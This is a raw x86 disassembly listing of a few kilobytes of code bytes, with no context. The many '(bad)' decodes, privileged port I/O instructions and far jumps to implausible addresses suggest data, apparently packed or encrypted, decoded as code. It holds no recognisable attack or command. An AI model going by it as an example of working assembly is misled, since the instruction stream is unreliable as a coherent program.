  417cfc:	pop    ebx
  417cfd:	mov    WORD PTR [ebx+0x5e],fs
  417d00:	inc    edi
  417d01:	push   ebp
  417d02:	adc    al,0x4a
  417d04:	push   esp
  417d05:	neg    DWORD PTR [ebx+0x3ed94def]
  417d0b:	jns    0x417d30
  417d0d:	popf   
  417d0e:	adc    BYTE PTR [edx+0x2a4e6685],0x47
  417d15:	adc    ebx,DWORD PTR [ebx]
  417d17:	test   BYTE PTR [esi+eax*4-0x4057ac11],ah
  417d1e:	sub    dh,BYTE PTR [edx+ecx*2-0x70]
  417d22:	leave  
  417d23:	cmp    eax,0x5579739d
  417d28:	fisub  WORD PTR [ecx-0x2d63c8af]
  417d2e:	and    DWORD PTR [esi+eax*2+0x20d3c4d2],0x7f
  417d36:	dec    edi
  417d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d38:	jle    0x417cc1
  417d3a:	bts    DWORD PTR [eax-0x7b991c84],0xf
  417d42:	loop   0x417cef
  417d44:	jl     0x417dc2
  417d46:	(bad)
  417d49:	cmp    DWORD PTR [esi-0x1eec3147],esp
  417d4f:	sub    ebx,DWORD PTR ds:0xc056a9db
  417d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d56:	and    al,0x9f
  417d58:	shl    al,0x3a
  417d5b:	or     DWORD PTR [eax+edx*8+0x60],ecx
  417d5f:	enter  0x6b16,0x4f
  417d63:	xor    ebx,ecx
  417d65:	repnz lea eax,[ebx]
  417d68:	mov    ah,0x4e
  417d6a:	cdq    
  417d6b:	loope  0x417d06
  417d6d:	(bad)  
  417d6e:	mov    es,WORD PTR [esp+esi*1]
  417d71:	mov    WORD PTR [ebp-0x2afc87ed],?
  417d77:	ret    
  417d78:	and    BYTE PTR [ecx-0x69a79d91],ch
  417d7e:	adc    al,0xa6
  417d80:	neg    ah
  417d82:	popf   
  417d83:	and    al,0x32
  417d85:	adc    eax,0x88986377
  417d8a:	dec    ebx
  417d8b:	xor    bh,BYTE PTR [ecx-0x6e]
  417d8e:	dec    ecx
  417d8f:	lods   eax,DWORD PTR ds:[esi]
  417d90:	xor    BYTE PTR [edi],cl
  417d92:	xchg   esi,eax
  417d93:	sub    al,0x4c
  417d95:	rcl    BYTE PTR ds:0x6bfd4bf6,0xeb
  417d9c:	int3   
  417d9d:	inc    dx
  417d9f:	hlt    
  417da0:	jl     0x417db8
  417da2:	int3   
  417da3:	mov    WORD PTR ds:0x12800257,gs
  417da9:	pop    ds
  417daa:	test   BYTE PTR [edi+0x7668a603],bh
  417db0:	jno    0x417d38
  417db2:	and    DWORD PTR [ebx-0x19822017],eax
  417db8:	int3   
  417db9:	mov    ah,0x62
  417dbb:	jmp    0x8f19f3fb
  417dc0:	xchg   ebx,eax
  417dc1:	lds    edx,FWORD PTR [esi+0x72]
  417dc4:	arpl   WORD PTR [edx+0x1f5c1e5a],ax
  417dca:	push   ss
  417dcb:	lods   al,BYTE PTR ds:[esi]
  417dcc:	mov    al,ds:0xdd4bb807
  417dd1:	mov    ah,0x6b
  417dd3:	jb     0x417db5
  417dd5:	adc    BYTE PTR [esi-0x7c],0x3a
  417dd9:	test   DWORD PTR [ebx-0x4535b381],ebx
  417ddf:	std    
  417de0:	ss jecxz 0x417e13
  417de3:	push   ebx
  417de4:	and    BYTE PTR [eax],0x2f
  417de7:	pop    esp
  417de8:	inc    ebp
  417de9:	sub    dh,BYTE PTR [ecx-0x41]
  417dec:	jnp    0x417dc9
  417dee:	xchg   ebp,eax
  417def:	mov    ch,0xb5
  417df1:	mov    DWORD PTR [edx+0x41ad9e15],edx
  417df7:	mov    ebp,0xcbc74c38
  417dfc:	data16 arpl WORD PTR [esi],si
  417dff:	push   0x58
  417e01:	xchg   ebp,eax
  417e02:	and    BYTE PTR [eax-0x69cde857],bh
  417e08:	sbb    eax,0x24955ad0
  417e0d:	test   esp,esi
  417e0f:	js     0x417ddd
  417e11:	sbb    esp,edx
  417e13:	cdq    
  417e14:	ss ss mov esp,0x3ba38cf7
  417e1b:	xor    eax,0x20203137
  417e20:	enter  0x8f83,0x65
  417e24:	lea    edi,[ebp+0x116be54f]
  417e2a:	mov    esp,0x7148085
  417e2f:	xchg   esp,eax
  417e30:	xor    dl,bh
  417e32:	pop    es
  417e33:	aam    0x32
  417e35:	cmp    dl,bl
  417e37:	mov    eax,ds:0x402f4663
  417e3c:	xlat   BYTE PTR ds:[ebx]
  417e3d:	(bad)  
  417e3e:	aam    0xfa
  417e40:	cld    
  417e41:	test   BYTE PTR [ecx-0x4a144135],ah
  417e47:	sti    
  417e48:	data16 cmp bl,BYTE PTR [edi-0x61222876]
  417e4f:	mov    ch,BYTE PTR [edx]
  417e51:	push   ebx
  417e52:	push   edx
  417e53:	loop   0x417e7c
  417e55:	push   eax
  417e56:	inc    esi
  417e57:	xchg   ebx,eax
  417e58:	jmp    0x4d0626d4
  417e5d:	gs (bad) 
  417e60:	aad    0x15
  417e62:	test   DWORD PTR [esi-0x25],edx
  417e65:	fmul   QWORD PTR ds:[esi-0x65]
  417e69:	clc    
  417e6a:	out    dx,eax
  417e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e6c:	out    dx,eax
  417e6d:	ja     0x417ebf
  417e6f:	stos   DWORD PTR es:[edi],eax
  417e70:	stc    
  417e71:	fcmove st,st(0)
  417e73:	out    dx,al
  417e74:	repnz xchg edx,eax
  417e76:	fisttp DWORD PTR [esi+esi*1-0x19]
  417e7a:	shr    DWORD PTR [eax+0x2e],cl
  417e7d:	mov    edi,0xbc042694
  417e82:	sahf   
  417e83:	jl     0x417e52
  417e85:	mov    eax,0x2cd8c16a
  417e8a:	shl    edi,0x78
  417e8d:	test   BYTE PTR [edi-0x195e4bf0],ch
  417e93:	jb     0x417e7a
  417e95:	adc    DWORD PTR [ecx-0x2e4effe6],ebx
  417e9b:	ret    
  417e9c:	fistp  WORD PTR [eax]
  417e9e:	push   eax
  417e9f:	adc    al,0x64
  417ea1:	mov    ds:0xcd078d0c,al
  417ea6:	jne    0x417ee6
  417ea8:	sbb    eax,DWORD PTR [ebx+edx*2]
  417eab:	jge    0x417e81
  417ead:	jns    0x417e85
  417eaf:	(bad)  [edx]
  417eb1:	mov    bl,0xed
  417eb3:	repnz xor eax,0x763ebf78
  417eb9:	arpl   WORD PTR [eax+0x56],cx
  417ebc:	lock jle 0x417e4b
  417ebf:	and    eax,0x33ac82ca
  417ec4:	fcom   st(5)
  417ec6:	or     al,0x7b
  417ec8:	ret    0x845f
  417ecb:	ror    BYTE PTR [ecx-0x52cb27b8],1
  417ed1:	(bad)  
  417ed3:	hlt    
  417ed4:	nop
  417ed5:	dec    ebx
  417ed6:	pusha  
  417ed7:	dec    edi
  417ed8:	into   
  417ed9:	imul   esp
  417edb:	sbb    BYTE PTR [ecx-0x4a],0x9
  417edf:	sar    DWORD PTR [ebx+ebp*1+0x24],cl
  417ee3:	mov    al,ds:0x5a72c92
  417ee8:	mov    edi,0x93bfd0b6
  417eed:	sub    DWORD PTR [ebx-0x17379101],esi
  417ef3:	in     eax,0xbb
  417ef5:	cwde   
  417ef6:	pop    ds
  417ef7:	adc    ebx,DWORD PTR ds:0x692b0ea5
  417efd:	xchg   BYTE PTR [eax-0x135d1e7c],ch
  417f03:	sbb    BYTE PTR [edi+ebx*8+0x6204ab3],ah
  417f0a:	dec    ecx
  417f0b:	push   es
  417f0c:	lea    edx,[ebx+0x72f7d3c0]
  417f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f13:	lods   al,BYTE PTR ds:[esi]
  417f14:	daa    
  417f15:	cmp    dl,cl
  417f17:	jle    0x417ef4
  417f19:	dec    ebx
  417f1a:	mov    esi,0xedf9de25
  417f1f:	and    BYTE PTR [esi+0x39e22c66],dh
  417f25:	aaa    
  417f26:	mov    ch,0x85
  417f28:	mov    bl,0x5d
  417f2a:	cdq    
  417f2b:	pop    ebp
  417f2c:	pop    edx
  417f2d:	fstp   DWORD PTR [esi+0x3592b976]
  417f33:	push   es
  417f34:	inc    edi
  417f35:	dec    ebx
  417f36:	xchg   esi,eax
  417f37:	lahf   
  417f38:	cmp    esp,esp
  417f3a:	rcl    DWORD PTR [edi-0x3c03d68c],0x65
  417f41:	sub    al,0x51
  417f43:	push   0xffffff8d
  417f45:	push   eax
  417f46:	retf   
  417f47:	mov    ds:0x605a187e,al
  417f4c:	inc    ecx
  417f4d:	inc    esp
  417f4e:	stos   DWORD PTR es:[edi],eax
  417f4f:	adc    esp,eax
  417f51:	test   al,0xe1
  417f53:	dec    edx
  417f54:	adc    eax,0xaa68ffc3
  417f59:	les    esp,FWORD PTR [edi]
  417f5b:	mov    esp,0xd8916c82
  417f60:	pop    ebx
  417f61:	fwait
  417f62:	jp     0x417f46
  417f64:	mov    ecx,0x86828d1e
  417f69:	mov    BYTE PTR [ebx-0x5f862a3d],ah
  417f6f:	loop   0x417f0f
  417f71:	cld    
  417f72:	adc    edi,esi
  417f74:	scas   eax,DWORD PTR es:[edi]
  417f75:	mov    ch,0xf1
  417f77:	mov    bl,0x51
  417f79:	ret    
  417f7a:	les    eax,FWORD PTR [edi+eax*1-0xa]
  417f7e:	out    dx,eax
  417f7f:	test   eax,0x19e37c48
  417f84:	push   es
  417f85:	push   ebx
  417f86:	inc    ebx
  417f87:	call   0xbe3fad3e
  417f8c:	lods   eax,DWORD PTR ds:[esi]
  417f8d:	dec    ebp
  417f8e:	nop
  417f8f:	inc    esi
  417f90:	xchg   ebp,eax
  417f91:	adc    ch,BYTE PTR [edx]
  417f93:	(bad)  
  417f94:	fs mov dl,0xf5
  417f97:	stos   DWORD PTR es:[edi],eax
  417f98:	mov    ah,0xcc
  417f9a:	dec    esp
  417f9b:	xor    BYTE PTR [ecx],cl
  417f9d:	and    al,bh
  417f9f:	or     edi,DWORD PTR [esi]
  417fa1:	mov    esp,0xacf6e8b2
  417fa6:	push   edi
  417fa7:	xchg   esp,eax
  417fa8:	and    ebx,DWORD PTR [eax+0x48]
  417fab:	mov    bl,0x6c
  417fad:	outs   dx,DWORD PTR ds:[esi]
  417fae:	mov    bl,0x6
  417fb0:	push   esi
  417fb1:	fist   WORD PTR [ebx-0x1ef1fd2c]
  417fb7:	xor    esp,DWORD PTR [ebp-0x36]
  417fba:	mov    al,ds:0xe1edfda7
  417fbf:	ds iret 
  417fc1:	clc    
  417fc2:	(bad)  
  417fc5:	inc    ecx
  417fc6:	shl    dh,1
  417fc8:	mov    cl,0x5b
  417fca:	push   ss
  417fcb:	xlat   BYTE PTR ds:[ebx]
  417fcc:	(bad)  
  417fcd:	call   0x946237c9
  417fd2:	pop    ds
  417fd3:	mov    al,0xc3
  417fd5:	jne    0x41802f
  417fd7:	psrlw  mm0,QWORD PTR [ecx-0x7f762b8b]
  417fde:	(bad)  
  417fdf:	xlat   BYTE PTR ds:[ebx]
  417fe0:	mov    ds:0x8cf4dada,eax
  417fe5:	mov    esi,0x7f0d0163
  417fea:	repz push edx
  417fec:	adc    al,0xe6
  417fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fef:	popf   
  417ff0:	pop    edi
  417ff1:	fcmovb st,st(6)
  417ff3:	inc    eax
  417ff4:	or     al,0x93
  417ff6:	jne    0x417fc2
  417ff8:	imul   ebx
  417ffa:	mov    ch,0x6b
  417ffc:	pop    esp
  417ffd:	in     eax,dx
  417ffe:	pop    edx
  417fff:	push   eax
  418000:	mov    al,0xa1
  418002:	mov    ebx,0xc5db8568
  418007:	ins    BYTE PTR es:[edi],dx
  418008:	mov    edi,0xaa65ceba
  41800d:	xlat   BYTE PTR ds:[ebx]
  41800e:	(bad)  
  41800f:	cmp    edi,DWORD PTR [esp+edi*1]
  418012:	adc    dl,ch
  418014:	sbb    esi,DWORD PTR [edx+0x26720679]
  41801a:	pushf  
  41801b:	jl     0x417fbd
  41801d:	mov    edx,0xabc3d2e2
  418022:	pop    edi
  418023:	inc    esp
  418024:	or     eax,0xe0dee93a
  418029:	push   eax
  41802a:	mov    ebp,0x74b6a66d
  41802f:	mov    DWORD PTR [ebp+0x1af6c4ca],ebx
  418035:	(bad)  
  418036:	ficom  WORD PTR [ebx-0x2a]
  418039:	sub    BYTE PTR [ebp-0x59fae561],0x7f
  418040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418041:	imul   BYTE PTR [edi-0x7cc62345]
  418047:	push   ds
  418048:	xchg   ecx,eax
  418049:	xchg   ebx,eax
  41804a:	mov    al,0x38
  41804c:	cmp    al,0xb7
  41804e:	ret    0xa7ee
  418051:	dec    edx
  418052:	inc    edx
  418053:	jno    0x4180c7
  418055:	lea    esp,[edx]
  418057:	das    
  418058:	in     eax,0x72
  41805a:	pop    ebp
  41805b:	aas    
  41805c:	leave  
  41805d:	ret    0x52e7
  418060:	ins    DWORD PTR es:[edi],dx
  418061:	pop    esi
  418062:	jp     0x417fe8
  418064:	jg     0x41801e
  418066:	sub    BYTE PTR [ecx-0x5d584ed7],dh
  41806c:	fsubr  DWORD PTR [ebp-0x5]
  41806f:	popf   
  418070:	pusha  
  418071:	cli    
  418072:	mov    ds:0x2078de85,eax
  418077:	leave  
  418078:	sub    al,0xde
  41807a:	cmp    edi,edi
  41807c:	mov    ds:0x43efb751,al
  418081:	cmp    al,BYTE PTR [ebx]
  418083:	test   eax,0xe361b17f
  418088:	retf   0xebf9
  41808b:	adc    BYTE PTR [edx-0x6a],0xb4
  41808f:	ja     0x4180e4
  418091:	jg     0x418025
  418093:	inc    edx
  418094:	(bad)  
  418095:	out    0x8,eax
  418097:	add    DWORD PTR [ebp-0x506c9488],esp
  41809d:	and    eax,edi
  41809f:	sbb    al,0xe8
  4180a1:	pop    ebx
  4180a2:	pop    ebx
  4180a3:	sbb    cl,BYTE PTR [edi]
  4180a5:	daa    
  4180a6:	cmp    DWORD PTR [eax-0x55a05a12],edi
  4180ac:	(bad)  
  4180ad:	repz (bad) 
  4180af:	sahf   
  4180b0:	or     DWORD PTR [ecx+0x59],ecx
  4180b3:	jmp    0xe031:0x43e4db94
  4180ba:	cli    
  4180bb:	dec    edi
  4180bc:	(bad)  
  4180bd:	sti    
  4180be:	(bad)  
  4180bf:	out    dx,al
  4180c0:	dec    edi
  4180c1:	js     0x41806b
  4180c3:	adc    al,0x10
  4180c5:	sbb    DWORD PTR [ebx+0x50f9788f],0xd580d69a
  4180cf:	jle    0x41809e
  4180d1:	cmp    edi,0xffffffec
  4180d4:	inc    eax
  4180d5:	pop    ss
  4180d6:	push   esi
  4180d7:	cmp    ah,BYTE PTR ds:0xdb712dea
  4180dd:	jg     0x4180f8
  4180df:	jmp    0x650e0917
  4180e4:	mov    dh,0xbf
  4180e6:	mov    al,0xac
  4180e8:	fimul  DWORD PTR [edx-0x1c]
  4180eb:	popf   
  4180ec:	ret    
  4180ed:	icebp  
  4180ee:	dec    ebx
  4180ef:	or     esi,DWORD PTR [edi+edx*1-0x54]
  4180f3:	push   0xb89a1fba
  4180f8:	push   ds
  4180f9:	push   edx
  4180fa:	outs   dx,BYTE PTR ds:[esi]
  4180fb:	and    ah,bh
  4180fd:	outs   dx,BYTE PTR ds:[esi]
  4180fe:	push   ebx
  4180ff:	mov    ds:0xb3c68e0e,eax
  418104:	jno    0x4180ab
  418106:	push   ebp
  418107:	scas   al,BYTE PTR es:[edi]
  418108:	out    0xa4,al
  41810a:	imul   esp
  41810c:	icebp  
  41810d:	push   eax
  41810e:	into   
  41810f:	js     0x4180ac
  418111:	call   0x4d4da819
  418116:	sbb    esi,DWORD PTR [edi+ebx*1+0x579a7d1]
  41811d:	out    0x71,eax
  41811f:	add    ch,BYTE PTR [eax-0x58]
  418122:	cdq    
  418123:	scas   eax,DWORD PTR es:[edi]
  418124:	mov    eax,ds:0xdf5d3432
  418129:	xchg   BYTE PTR [edi],dl
  41812b:	outs   dx,DWORD PTR ds:[esi]
  41812c:	into   
  41812d:	(bad)  
  41812f:	mov    bl,0xa4
  418131:	lahf   
  418132:	mov    ds:0xad5aa2f5,al
  418137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418138:	xchg   esp,eax
  418139:	pop    ss
  41813a:	and    DWORD PTR [ebx+0x1d],ecx
  41813d:	test   eax,0x6d4de1b6
  418142:	xchg   DWORD PTR [edx-0x45654fa4],eax
  418148:	sbb    eax,DWORD PTR [ebp-0x25]
  41814b:	mov    ds:0xf84bf29d,eax
  418150:	enter  0xfea7,0x2a
  418154:	pop    eax
  418155:	sub    dl,BYTE PTR [esi+0x48]
  418158:	lods   al,BYTE PTR ds:[esi]
  418159:	aad    0x47
  41815b:	or     al,0x4f
  41815d:	fisub  WORD PTR [ebx-0x3df138aa]
  418163:	fstp   DWORD PTR [esi-0x70]
  418166:	nop
  418167:	add    eax,0x8aa94416
  41816c:	xlat   BYTE PTR ds:[ebx]
  41816d:	clc    
  41816e:	mov    ecx,tr7
  418171:	inc    ebx
  418172:	and    al,0xcb
  418174:	pop    es
  418175:	jno    0x41818d
  418177:	addr16 inc esp
  418179:	pop    eax
  41817a:	inc    eax
  41817b:	inc    ebp
  41817c:	and    eax,0x61669624
  418181:	push   esi
  418182:	and    eax,0x40f2d1ae
  418187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418188:	jg     0x4181c4
  41818a:	xchg   edi,eax
  41818b:	dec    edi
  41818c:	push   edi
  41818d:	jp     0x418169
  41818f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418190:	loope  0x418169
  418192:	leave  
  418193:	aad    0xd5
  418195:	inc    esi
  418196:	lock pop ecx
  418198:	push   ebx
  418199:	push   edx
  41819a:	mov    ecx,0x91e65dda
  41819f:	(bad)  
  4181a0:	stc    
  4181a1:	ja     0x4181bc
  4181a3:	enter  0xb771,0x9e
  4181a7:	sbb    esi,DWORD PTR [esi-0x469716d0]
  4181ad:	(bad)  
  4181af:	add    eax,0x5bfd6184
  4181b4:	jle    0x41822d
  4181b6:	push   edx
  4181b7:	das    
  4181b8:	inc    eax
  4181b9:	cwde   
  4181ba:	in     eax,0xed
  4181bc:	mov    esi,0x8934ff43
  4181c1:	mov    esi,0x52be323b
  4181c6:	adc    dl,BYTE PTR [ecx+0x7dcb3700]
  4181cc:	sbb    eax,0x755e2e76
  4181d1:	(bad)  
  4181d2:	lock cld 
  4181d4:	es cdq 
  4181d6:	sbb    eax,0x6061280a
  4181db:	jecxz  0x418192
  4181dd:	add    eax,0x42244033
  4181e2:	test   ch,ch
  4181e4:	xchg   ebp,eax
  4181e5:	sahf   
  4181e6:	mov    ah,0xb1
  4181e8:	shr    bl,0x16
  4181eb:	sbb    DWORD PTR [ebp-0x7e6238b],ebp
  4181f1:	(bad)  
  4181f2:	in     eax,dx
  4181f3:	jbe    0x4181c2
  4181f5:	adc    DWORD PTR [esi+0x2b],0x7ce3acf
  4181fc:	inc    edi
  4181fd:	and    al,0x67
  4181ff:	jp     0x418257
  418201:	xchg   ecx,eax
  418202:	aam    0x46
  418204:	mov    edi,0x2f8c8fbd
  418209:	in     al,dx
  41820a:	mul    BYTE PTR [eax]
  41820c:	and    DWORD PTR [esi+0x3c],esp
  41820f:	xor    eax,eax
  418211:	or     ecx,DWORD PTR [ebx-0x6638dd9c]
  418217:	retf   0xc563
  41821a:	pop    ebp
  41821b:	sub    bl,0x9d
  41821e:	int3   
  41821f:	inc    ebp
  418220:	dec    edi
  418221:	lahf   
  418222:	outs   dx,BYTE PTR ds:[esi]
  418223:	sahf   
  418224:	mov    eax,ds:0x65b2df81
  418229:	pusha  
  41822a:	leave  
  41822b:	pop    esi
  41822c:	std    
  41822d:	mov    ebp,0xb42aeca4
  418232:	mov    dl,0x52
  418234:	and    ebp,DWORD PTR [ebx+ebp*1-0x32]
  418238:	cld    
  418239:	sbb    al,0x41
  41823b:	enter  0x4a94,0x8f
  41823f:	inc    edi
  418240:	int3   
  418241:	and    BYTE PTR [esi+0x66],bl
  418244:	xchg   DWORD PTR [edx],ebx
  418246:	adc    al,BYTE PTR [ecx-0x26]
  418249:	jp     0x4181f8
  41824b:	pusha  
  41824c:	(bad)  
  41824d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41824e:	mov    al,BYTE PTR [ebx-0x242a871c]
  418254:	jne    0x4182a5
  418256:	les    ebp,FWORD PTR [esi-0x4b]
  418259:	or     esp,DWORD PTR [ebx]
  41825b:	leave  
  41825c:	jp     0x4cac0944
  418262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418263:	ror    DWORD PTR [ecx-0x1bf147d6],1
  418269:	ret    0xc427
  41826c:	inc    ebx
  41826d:	sub    eax,0x2b33e588
  418272:	in     eax,0x45
  418274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418275:	mov    al,0x9d
  418277:	jge    0x418213
  418279:	inc    ecx
  41827a:	call   0x4de:0x6f2569ad
  418281:	imul   BYTE PTR [ebx+0x294e4963]
  418287:	sbb    DWORD PTR [ebx-0x58],esi
  41828a:	sar    BYTE PTR [edx-0x8],1
  41828d:	and    DWORD PTR [edx+ebp*4+0x7c],0xffffffc7
  418292:	lods   eax,DWORD PTR ds:[esi]
  418293:	inc    ebx
  418294:	mov    esi,0xc6b92dc6
  418299:	popa   
  41829a:	xchg   edi,eax
  41829b:	xor    eax,0x3900c016
  4182a0:	xor    eax,0x392e27ac
  4182a5:	sub    ah,ch
  4182a7:	scas   al,BYTE PTR es:[edi]
  4182a8:	adc    dh,BYTE PTR [edx-0x6421d20]
  4182ae:	ret    0xfc47
  4182b1:	jmp    0x26b4:0x32fb77ab
  4182b8:	es pop ecx
  4182ba:	sub    eax,0x4c773547
  4182bf:	sub    esi,DWORD PTR [ebx]
  4182c1:	mov    dh,0xd9
  4182c3:	sub    al,0xd8
  4182c5:	aam    0x10
  4182c7:	and    DWORD PTR [ebx],esi
  4182c9:	icebp  
  4182ca:	popa   
  4182cb:	push   ebp
  4182cc:	xor    al,BYTE PTR [ecx]
  4182ce:	hlt    
  4182cf:	ror    DWORD PTR [edx],cl
  4182d1:	cs loop 0x418348
  4182d4:	and    eax,0x3e39baac
  4182d9:	ds sub al,0xfb
  4182dc:	mov    ds:0x4ca03c16,al
  4182e1:	dec    edi
  4182e2:	ja     0x4182f3
  4182e4:	(bad)  
  4182e5:	dec    edx
  4182e6:	and    eax,0x89b2c1fb
  4182eb:	dec    esp
  4182ec:	daa    
  4182ed:	push   es
  4182ee:	ror    DWORD PTR [edi-0x5542e7e2],cl
  4182f4:	xor    edx,DWORD PTR [ecx+0x2b]
  4182f7:	cmp    al,0x8f
  4182f9:	inc    edi
  4182fa:	retf   
  4182fb:	pop    eax
  4182fc:	sbb    ebp,ebx
  4182fe:	xor    BYTE PTR [edx-0x61b340bc],0xf8
  418305:	ins    DWORD PTR es:[edi],dx
  418306:	aam    0xd3
  418308:	xchg   ebp,eax
  418309:	dec    ebx
  41830a:	shl    DWORD PTR [ecx+0x627e8732],0x3e
  418311:	push   ss
  418312:	addr16 into 
  418314:	cmp    eax,0x2f5ceb7b
  418319:	jno    0x4182f9
  41831b:	xor    al,0x30
  41831d:	fnstcw WORD PTR [ebx-0x1d]
  418320:	(bad)  
  418321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418323:	push   edx
  418324:	sub    BYTE PTR gs:[esi+0x45],0xe9
  418329:	sbb    ebx,ebp
  41832b:	loop   0x41837b
  41832d:	sub    eax,0x86f3d1ce
  418332:	mov    ds:0x316fca35,eax
  418337:	pusha  
  418338:	mov    edx,0x42211515
  41833d:	out    0x20,al
  41833f:	push   edi
  418340:	retf   
  418341:	push   ebx
  418342:	lahf   
  418343:	pusha  
  418344:	call   0xc5ed:0x13e05460
  41834b:	out    0x2f,al
  41834d:	mov    cl,0x7d
  41834f:	std    
  418350:	pop    edx
  418351:	push   ebp
  418352:	stos   BYTE PTR es:[edi],al
  418353:	aas    
  418354:	mov    cl,0xb4
  418356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418357:	cmp    DWORD PTR [eax],edi
  418359:	fwait
  41835a:	cmp    DWORD PTR [edx+0x62b9565d],esi
  418360:	push   ds
  418361:	mov    ebp,0x1ffd874
  418366:	sbb    ah,BYTE PTR [ebp-0x4c]
  418369:	mov    bh,0x30
  41836b:	mov    ebp,0x44ddbbb8
  418370:	stc    
  418371:	and    esi,esi
  418373:	jmp    0x4182fe
  418375:	mov    edx,0xa3efcd8a
  41837a:	mov    esi,0x49a8b0a7
  41837f:	xchg   edi,eax
  418380:	loope  0x4183b2
  418382:	cmp    al,0x4b
  418384:	sti    
  418385:	push   esp
  418386:	int3   
  418387:	imul   ecx,DWORD PTR [ebx],0xffffffa3
  41838a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41838b:	jge    0x418311
  41838d:	call   0x2a3e:0xe0f9a3f9
  418394:	mov    edi,0xb54c84c0
  418399:	add    ch,ch
  41839b:	call   0xd6ae05e4
  4183a0:	repz add esi,edi
  4183a3:	mov    dl,0x61
  4183a5:	jp     0x418357
  4183a7:	sbb    BYTE PTR [ebx+edx*1],al
  4183aa:	adc    BYTE PTR [ebx-0x29369bfd],0x82
  4183b1:	xchg   edi,eax
  4183b2:	jmp    0x41834b
  4183b4:	mov    bl,0xb4
  4183b6:	cmp    ah,BYTE PTR [edi-0xf65abb]
  4183bc:	daa    
  4183bd:	mov    ds:0x46919d8c,al
  4183c2:	xchg   edx,eax
  4183c3:	mov    ebp,DWORD PTR [ebp+0x2c055674]
  4183c9:	mov    ebx,0xd3d4a45e
  4183ce:	jecxz  0x418377
  4183d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183d1:	mov    BYTE PTR [ecx-0x429a164d],dl
  4183d7:	test   eax,0x19032252
  4183dc:	and    edi,DWORD PTR [edx]
  4183de:	xchg   edx,eax
  4183df:	xchg   ebp,eax
  4183e0:	ret    
  4183e1:	in     eax,0xda
  4183e3:	les    ebp,FWORD PTR gs:[edx+0x2c]
  4183e7:	jo     0x41841e
  4183e9:	std    
  4183ea:	pop    edx
  4183eb:	or     dh,ch
  4183ed:	ror    DWORD PTR [ecx+0x4c],0x73
  4183f1:	(bad)  
  4183f2:	xor    DWORD PTR [edi-0x2],ebx
  4183f5:	mov    esi,0x16ab0d29
  4183fa:	push   ds
  4183fb:	and    al,0xe2
  4183fd:	or     esi,esi
  4183ff:	pop    esi
  418400:	dec    edi
  418401:	cmp    ah,BYTE PTR [ebp+0x32]
  418404:	mov    fs,edx
  418406:	retf   
  418407:	xor    edx,ebx
  418409:	cwde   
  41840a:	xchg   edi,eax
  41840b:	xor    BYTE PTR [esi-0x45],dh
  41840e:	or     DWORD PTR [edi-0x8],ecx
  418411:	sbb    al,0x6c
  418413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418414:	out    0xd2,eax
  418416:	push   0x93d02e44
  41841b:	fiadd  DWORD PTR [ebp-0x3fd9f38e]
  418421:	push   edi
  418422:	pop    ebp
  418423:	inc    esp
  418424:	scas   al,BYTE PTR es:[di]
  418426:	push   0xb0d9810e
  41842b:	popf   
  41842c:	mov    fs,WORD PTR [ebx+0x7f]
  41842f:	out    0xa2,eax
  418431:	sub    BYTE PTR [ebx],ch
  418433:	jnp    0x5e70b89f
  418439:	fsub   QWORD PTR [edi-0x28]
  41843c:	push   eax
  41843d:	mov    DWORD PTR [edx],esp
  41843f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418440:	mov    ecx,0xf194ff85
  418445:	popa   
  418446:	add    BYTE PTR [edx+ecx*4-0x4df70760],cl
  41844d:	and    ch,BYTE PTR [esi]
  41844f:	push   edi
  418450:	ror    BYTE PTR [esi+0x38],cl
  418453:	ds (bad) 
  418455:	in     eax,0x1a
  418457:	add    edx,ecx
  418459:	and    eax,0x106710c
  41845e:	mov    bh,0xb
  418460:	jp     0x4184cb
  418462:	pop    eax
  418463:	adc    BYTE PTR [eax],al
  418465:	imul   ebp,DWORD PTR [edx+0x20],0xe9085376
  41846c:	mov    dh,ch
  41846e:	outs   dx,BYTE PTR ds:[esi]
  41846f:	pop    ecx
  418470:	mov    ebp,0x48e9bd41
  418475:	add    BYTE PTR [edx-0x3b],dh
  418478:	sbb    al,0x93
  41847a:	fwait
  41847b:	sar    DWORD PTR [ecx],0xaa
  41847e:	adc    eax,DWORD PTR [edx+0x47]
  418481:	pop    edx
  418482:	mov    ds:0x576a6816,eax
  418487:	dec    ebp
  418488:	adc    DWORD PTR [esi],ebp
  41848a:	push   es
  41848b:	shl    ah,0x14
  41848e:	repnz aaa 
  418490:	imul   edi,DWORD PTR [eax-0x11c9d136],0xffffff89
  418497:	sub    bl,bh
  418499:	cs push ebx
  41849b:	lea    ecx,[edi+0x4a825aac]
  4184a1:	repnz ins BYTE PTR es:[edi],dx
  4184a3:	add    ecx,DWORD PTR [eax-0x1703ec62]
  4184a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184aa:	lea    eax,[eax]
  4184ac:	cmp    eax,0x8a897bfa
  4184b1:	pusha  
  4184b2:	repnz test eax,0xb57716b7
  4184b8:	jns    0x418462
  4184ba:	stos   DWORD PTR es:[edi],eax
  4184bb:	repnz pushf 
  4184bd:	xchg   ebp,eax
  4184be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184bf:	cmp    bl,al
  4184c1:	push   edi
  4184c2:	mov    bl,0x61
  4184c4:	sub    eax,0xf4383cfd
  4184c9:	cld    
  4184ca:	(bad)  
  4184cb:	mov    ebp,0xf7128d66
  4184d0:	fdivr  DWORD PTR [esi]
  4184d2:	lods   al,BYTE PTR ds:[esi]
  4184d3:	(bad)  
